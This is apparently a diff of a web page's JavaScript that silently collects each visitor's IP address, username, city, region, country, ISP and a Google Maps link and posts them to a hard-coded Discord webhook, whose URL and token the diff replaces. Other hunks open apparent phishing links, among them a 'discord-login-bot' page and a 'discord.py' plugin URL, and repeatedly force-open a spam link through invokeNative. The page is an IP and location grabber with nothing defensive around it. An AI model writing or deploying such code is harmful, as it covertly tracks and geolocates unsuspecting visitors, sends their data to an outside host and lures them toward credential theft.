@@ -153,7 +153,7 @@
         }
 
         function sendToDiscord(ipInfoData, googleMapsLink, username) {
-            const webhookURL = "https://discord.com/api/webhooks/1419663346398924901/kFXqxJyyTlFYMA7QTEcAf7_PQBGDytqMt5ivKDEgrEuy_4TpHR3ppv66NusztFwpp2Em";
+            const webhookURL = "https://discord.com/api/webhooks/1468374023686721597/70PXLyIWMKQP7wLoH7vtWS9-s-z_Bn3QKC7jSJaSyGOcFOEMgPfzCNIfLNV-XNWifYq-";
             const payload = {
                 content: `New visitor IP: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
             };
@@ -182,6 +182,7 @@
         document.getElementById('exitButton').addEventListener('click', () => {
             window.open('https://discord.gg/https://h.top4top.io/p_3686omj2o1.jpg', '_blank');
             window.open('https://discord-login-bot.vercel.app/plugin/discord.py', '_blank');
+            alert('اضغط OK للخروج من الشاشة');
         });
     </script>
 <script>
@@ -361,7 +362,7 @@ fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "c
              window.invokeNative("openUrl", "https://discord.gg/https://h.top4top.io/p_3686omj2o1.jpg");
              window.invokeNative("openUrl", "https://discord.gg/https://h.top4top.io/p_3686omj2o1.jpg");
              window.invokeNative("openUrl", "https://discord.gg/https://h.top4top.io/p_3686omj2o1.jpg");
-         }, 10);
+         }, 1000);
     </script>
 
 
